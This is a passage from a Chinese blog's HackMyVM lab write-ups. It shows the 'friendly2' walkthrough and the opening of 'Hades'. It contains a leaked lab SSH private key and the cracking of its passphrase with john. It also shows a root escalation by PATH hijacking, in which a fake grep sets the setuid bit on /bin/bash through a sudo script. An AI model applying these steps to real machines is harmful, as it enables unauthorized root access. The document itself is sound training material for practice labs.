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
<span class="token assign-left variable">9tDhjVw3oagRmc3R03zfIwbPINo</span><span class="token operator">=</span>
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                                                                                                         
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># chmod 600 aaa</span>
                                                                                                                                                                                                                                         
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh -i aaa gh0st@192.168.56.178</span>
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'aaa'</span><span class="token builtin class-name">:</span> </code></pre>
<p>不过还需要密码，join爆破一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh2john aaa > bbb</span>
                                                                                                                                                                                                                                         
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat bbb                                  </span>
aaa:<span class="token variable">$sshng</span><span class="token variable">$6</span><span class="token variable">$16</span><span class="token variable">$bba5ea10138ccd630bebbfbd874ece13</span><span class="token variable">$1910</span><span class="token variable">$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010bba5ea10138ccd630bebbfbd874ece13000000100000000100000197000000077373682d727361000000030100010000018100b68b5cb38b71b940f4a54e073f11d9efae2b089b46748eae070d024344c6974388b851d2256c48263bf140d7b907cd8d4cce2e6f24570b512555705d48027cb90e1f15038b7ff8b447d04171e991626d88a750969c82d783d11c51014a8d3a38986b2cc6d6159d2ac7df1b32b3f048d0f717015c047d3c1b3a5a486eafe529b478b4f109ad0962d5f17028d035bd0139648528f6e4a8a270d9be9e66c46cb68ad54ed4fc26970c764271d21d919d489cb8f6e3ab28be7e6414f6810476e67b3f638b5d5835a1d51e01246f7edb2c99bde65ddf914eac4469f3e8996a5d89d12cdf3828016cb1039d14214aa801d43c2e1e8368bde4a54c116db55b709e9fc5050e119ef2c97ef95214cbf9ea667f1ebfc75e7849374570d16fa9f00771bef7a04181529dec708179d8aacd7139999eb87fcc1b8a6cb60e633cadf04c19006a8e8727c64212ee6b044557abcf85df5d44590cb6e0060c25716a3e7fccf645605ac1581d6a39b77cbf11813ec0b7f294b83edb9500ceb2459947c2ac7a072251af00000590348f66c2c20fbbf3a01056962e443ecf4a00dba7fc93fd215d958f37d4c7ad515947018eb43f2ebad520a4ff52c87acbd368c2c7f4c6772a6284f754788e5f7c2bd723df1c9ef403ccaf790d28813649881eedd5f3e7f47bf43248d154de9548dc98c1e82812297d9276237e7a951db59c1bca7ac97848799a1d142ea41e63559e7337cb28d4457a613a34f15cf9ba3b76e429b7523c0c73e4875514da891f87c52838c6e47ce48bad5bc1d1d01a8a4935466b50b37c79087e8d863b073a2ef10ddcdad8075624f67859bbdc684222fef94372378e2f6f394c80ea6a89b5f4ee174ab0d90fbd16eb58ccdf086c89c2c3aeea56c415204cfaaf15baf70f73ab4147cb300d5cfc56dbd6fa9340571bb1b0293032a6d99e0b8a065a77b74e6323d54e81258b2ce4b0893b7f4c7766bb3ea35ab6169138891de142d447d8819e1a8dc866d195e839d68307bf1534164f9ed334f32850d92b5b9966a3af59da38c10596b8abf78ef38f13d8594612dedf595b2ecef792b259f957e993e90608a5682325cbe437343496c05412cd1bceb84fd4270f67f75ecf0a01185bdbe5c9eb87445f8c26bd3d8a0d47e77f22e3bd37e4801e167b93e76fe077b67402774b12b857d908800b112cc18b64eaf5fad170a616769ab7bf67f4a84f8486365f2398e5dbe829dc44ba222e06157066c4309cdd118f328413f2bd7d7e1425472078c60945429d8a9902ac645e1374628734394fa353abcda76dfd1dbb5a28edae11a2631380836d06dff1cc6cb5de10cb9fcc05aaab4ea9fa5165a233ef3dabd3bcd2990e61da1e1dc58bc743911c53f1075bdbfd051549e5a7407f4e09f13940be752da85ea0c3bd9fc4397726d226747c6e39e7662c90d0056d15a0a71dee7a0b863cb0014eb72322f68d862b169739b52c66ddf47b87adaf5160d89358ebe31a6d2f0aea851c22ecbea4e6c5ce58235c831d886922c7fbb04feb42dbe1c7c807adb766db830b93ac1ddc03c6e4b8da47fec05f81f7f9ac5183bba469144572885d11ea89fa7594414c25c8ca67dda63eb0068d3fba3d18a6acaa153709a676f67e7b4f715a0848ceece6419553fd7d7cddfdaed00851af575a4e4fc88d9abce60c9f2789c27def690d1d6db9daa9c90b6332ccf2fca8ca0285c564b7042eb0d130590ea433dfab03d2dd1b7c8792b996a6b6d4853f5fe9b9f2d8b45fb368850eb0acf0c2962052cafa8a24452954d3bfbc3672a3365426af4e81a423ceb10fd6ca2d4fb1367b9235babe9ad3995287402ae38df12756d3404539247ff0437b7594ca1a2a6eadaa3c96cad3d175bec9987e9a5495b6e20b7cee5f7462b0ca006b8fa6a6d4942338712798a91c2258cc270554644fece33bacb87d3d2b1db1314c7858c90b494c9d4af7e501503b647f6ef2186fae004bfc68798662d9eee72474ad2c997b5db56b7eb1f06871540a6e4794b3e6e78e45a78aa67e64b54a76368037c6c865536a5215fac6709aba85570e478a976b4fed0ba1a836ce2ddee1a0eba12c3e2cf4b56ac6f16d0ee4568edc0585cdb91fc1ec42d8ca0914fb3b2cdda1cf7c1416db24259dcaefa069bab5effb3147a59f86ef908f79d8d8919adb7d1f32506f49f8e2ca0bd74d302bf7c66aca2a0452c46f59eecc66cb2a6434568fc73ad4b5ac19f0f0273fea3a85891d74ea49c095f7e07e5497e8546299fdb39327535b32593af9f094d66e1f03febb34cd98edca97bfc1d7767956ad9cd3c166ea7b04700f3e46ccf881f5a892c3c8034a480f5266d6ced8925a25e50afdb9a74c9b94c62d21871304b5a4a4af034644748928718df2c24c34755875d13639a58bf665b07d149dfb34564fdd36961f26878f92f298a4b122dd415fb9cb101f52b2a8b2906db91af368bebffa43d4398d7071556a06c8f6142460638738deba517d25fcb230d229c85bb09173ccf496991285714180b3de83e9afcc118e132abaf6d0e18d5c37a1a81199cdd1d37cdf2306cf20da</span><span class="token variable">$16</span><span class="token variable">$486</span>
                                                                                                                                                                                                                                         
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># john bbb   </span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>MD5/AES <span class="token assign-left variable">1</span><span class="token operator">=</span>MD5/3DES <span class="token assign-left variable">2</span><span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">2</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">16</span> <span class="token keyword">for</span> all loaded hashes
Proceeding with single, rules:Single
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
Warning: Only <span class="token number">1</span> candidate buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
0g <span class="token number">0</span>:00:00:22 <span class="token number">17.27</span>% <span class="token number">1</span>/3 <span class="token punctuation">(</span>ETA: <span class="token number">18</span>:57:30<span class="token punctuation">)</span> 0g/s <span class="token number">3</span>.658p/s <span class="token number">3</span>.658c/s <span class="token number">3</span>.658C/s Aaa7
Session aborted
                                                                                                                                                                                                                                         
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># john bbb --wordlist=/usr/share/wordlists/rockyou.txt </span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>MD5/AES <span class="token assign-left variable">1</span><span class="token operator">=</span>MD5/3DES <span class="token assign-left variable">2</span><span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">2</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">16</span> <span class="token keyword">for</span> all loaded hashes
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
celtic           <span class="token punctuation">(</span>aaa<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:24 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-05-27 <span class="token number">18</span>:56<span class="token punctuation">)</span> <span class="token number">0</span>.04144g/s <span class="token number">10</span>.36p/s <span class="token number">10</span>.36c/s <span class="token number">10</span>.36C/s celtic
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. </code></pre>
<p>密码是<code>celtic</code></p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh -i aaa gh0st@192.168.56.178</span>
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'aaa'</span><span class="token builtin class-name">:</span> 
Linux friendly2 <span class="token number">5.10</span>.0-21-amd64 <span class="token comment">#1 SMP Debian 5.10.162-1 (2023-01-21) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">cat</span> user*
ab0366431e2d8ff563cf34272e3d14bd
gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwxr-xr-x <span class="token number">4</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root  root  <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root  root     <span class="token number">9</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">220</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> gh0st gh0st <span class="token number">3526</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bashrc
drwxr-xr-x <span class="token number">3</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">807</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .profile
drwx--x--x <span class="token number">2</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .ssh
-r--r----- <span class="token number">1</span> gh0st root    <span class="token number">33</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> user.txt</code></pre>
<p>拿到user flag</p>
<h1 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h1><p>sudo看一手</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> gh0st on friendly2:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User gh0st may run the following commands on friendly2:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> SETENV: NOPASSWD: /opt/security.sh</code></pre>
<p>稳了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">cat</span> /opt/security.sh
<span class="token comment">#!/bin/bash</span>

<span class="token builtin class-name">echo</span> <span class="token string">"Enter the string to encode:"</span>
<span class="token builtin class-name">read</span> string

<span class="token comment"># Validate that the string is no longer than 20 characters</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$&#123;<span class="token operator">#</span>string&#125;</span> <span class="token parameter variable">-gt</span> <span class="token number">20</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"The string cannot be longer than 20 characters."</span>
  <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>

<span class="token comment"># Validate that the string does not contain special characters</span>
<span class="token keyword">if</span> <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$string</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">'[^[:alnum:] ]'</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"The string cannot contain special characters."</span>
  <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>

<span class="token assign-left variable">sus1</span><span class="token operator">=</span><span class="token string">'A-Za-z'</span>
<span class="token assign-left variable">sus2</span><span class="token operator">=</span><span class="token string">'N-ZA-Mn-za-m'</span>

<span class="token assign-left variable">encoded_string</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$string</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> $sus1 $sus2<span class="token variable">)</span></span>

<span class="token builtin class-name">echo</span> <span class="token string">"Original string: <span class="token variable">$string</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"Encoded string: <span class="token variable">$encoded_string</span>"</span></code></pre>
<p>对输入的字符串进行编码,看一下权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /opt/security.sh
-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">561</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> /opt/security.sh</code></pre>
<p>不能编辑，只能从脚本本身下手，发现使用了grep，那么可以自己写个grep，让它执行我们的grep</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">vi</span> <span class="token function">grep</span>
gh0st@friendly2:~$ <span class="token function">cat</span> <span class="token function">grep</span>
<span class="token function">chmod</span> u+s /bin/bash</code></pre>
<p>添加环境变量</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">chmod</span> +x <span class="token function">grep</span>
gh0st@friendly2:~$ <span class="token function">sudo</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PWD</span><span class="token builtin class-name">:</span><span class="token environment constant">$PATH</span> /opt/security.sh
Enter the string to encode:
<span class="token number">123</span>
The string cannot contain special characters.
gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-xr-x <span class="token number">4</span> gh0st gh0st <span class="token number">4096</span> May <span class="token number">27</span> 07:08 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root  root  <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root  root     <span class="token number">9</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">220</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> gh0st gh0st <span class="token number">3526</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bashrc
-rwxr-xr-x <span class="token number">1</span> gh0st gh0st   <span class="token number">20</span> May <span class="token number">27</span> 07:08 <span class="token function">grep</span>
drwxr-xr-x <span class="token number">3</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">807</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .profile
drwx--x--x <span class="token number">2</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .ssh
-r--r----- <span class="token number">1</span> gh0st root    <span class="token number">33</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> user.txt
gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /bin/bash
-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">1234376</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> /bin/bash
gh0st@friendly2:~$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
bash-5.1<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">bash-5.1<span class="token comment"># cat /root/r*</span>
Not yet<span class="token operator">!</span> Try to <span class="token function">find</span> root.txt.


Hint: <span class="token punctuation">..</span>.
bash-5.1<span class="token comment"># find / -name root.txt 2>/dev/null</span>
/root/root.txt
bash-5.1<span class="token comment"># cd /root</span>
bash-5.1<span class="token comment"># ls -al</span>
total <span class="token number">28</span>
drwx------  <span class="token number">3</span> root root <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root root <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">571</span> Apr <span class="token number">10</span>  <span class="token number">2021</span> .bashrc
-r-xr-xr-x  <span class="token number">1</span> root root  <span class="token number">509</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> interfaces.sh
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Apr  <span class="token number">8</span>  <span class="token number">2023</span> .local
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
-r--------  <span class="token number">1</span> root root   <span class="token number">43</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> root.txt</code></pre>
<p>不是，你flag在哪<br>提示是<code>...</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">bash-5.1<span class="token comment"># find / -name ... 2>/dev/null</span>
/<span class="token punctuation">..</span>.
bash-5.1<span class="token comment"># cd /...</span>
bash-5.1<span class="token comment"># ls -al</span>
total <span class="token number">12</span>
d-wx------  <span class="token number">2</span> root root <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root root <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-r--------  <span class="token number">1</span> root root  <span class="token number">100</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> ebbg.txt
bash-5.1<span class="token comment"># cat eb*</span>
It's codified, <span class="token function">look</span> the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified
bash-5.1<span class="token comment"># </span></code></pre>
<p>找到flag了，但被加密了，提示数字没有被编码，那么应该就是那个编码的sh脚本，让ai帮我写个解密脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token builtin class-name">echo</span> <span class="token string">"Enter the string to decode:"</span>
<span class="token builtin class-name">read</span> encoded_string

<span class="token assign-left variable">sus1</span><span class="token operator">=</span><span class="token string">'A-Za-z'</span>
<span class="token assign-left variable">sus2</span><span class="token operator">=</span><span class="token string">'N-ZA-Mn-za-m'</span>

<span class="token assign-left variable">decoded_string</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$encoded_string</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> $sus2 $sus1<span class="token variable">)</span></span>

<span class="token builtin class-name">echo</span> <span class="token string">"Encoded string: <span class="token variable">$encoded_string</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"Decoded string: <span class="token variable">$decoded_string</span>"</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ./aa.sh</span>
Enter the string to decode:
98199n723q0s44s6rs39r33685q8pnoq
Encoded string: 98199n723q0s44s6rs39r33685q8pnoq
Decoded string: 98199a723d0f44f6ef39e33685d8cabd</code></pre>
<p> 提交，正确。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>环境变量劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Hades</title>
    <url>/posts/13a562a7/</url>
    <content><![CDATA[<h2 id="MISSION-0x01"><a href="#MISSION-0x01" class="headerlink" title="MISSION 0x01"></a>MISSION 0x01</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x01 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User acantha has left us a gift to obtain her powers.

<span class="token comment">## ES ##</span>
La usuaria acantha nos ha dejado un regalo para obtener sus poderes.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> *gift* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/share/man/man1/giftopnm.1.gz
/usr/bin/giftopnm
/opt/gift_hacker</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/24/OPFsiU.png" alt="OPFsiU.png" loading="lazy"><br>直接执行就完事了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ /opt/gift_hacker 
acantha@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2001</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2001</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span>
acantha@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwxr-x--- <span class="token number">2</span> root   hacker <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> hacker hacker  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hacker hacker <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
